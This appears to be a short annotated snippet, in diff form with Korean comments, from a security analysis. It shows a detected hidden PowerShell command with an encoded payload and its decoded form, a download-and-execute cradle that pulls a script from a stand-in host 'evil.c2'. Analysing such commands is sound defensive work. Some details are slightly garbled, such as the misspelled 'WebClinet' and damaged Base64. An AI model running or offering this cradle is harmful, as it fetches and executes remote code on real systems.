@@ -1,0 +1,11 @@
+#탐지된 PowerShell 커맨드 라인
+powershell.exe -w hidden - NoP -Ep Bypass
+-Enc SQBFAFgAIAAoAE4AZQB3AC0AT2JqAGUAYwB0
+AIABTAHMATQB0AC4AVwB1AGIAQwBsAGkAZQBuAHQA
+KQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBoAG4A
+ZwAiACcaaAB0AHQAcABzADoALwAvAGUAdgBpAGwA
+LgBjADIALwBwAGEAeQBsAG8AYQBkACcAKQA=
+# Base64 디코딩 후 (PowerShell로 디코딩)
+IEX (New-Object Net.WebClinet)
+.DownloadString('https://evil.c2/payload')
+#의미: 원격 URL에서 스크립트 다운로드 후 즉시 실행
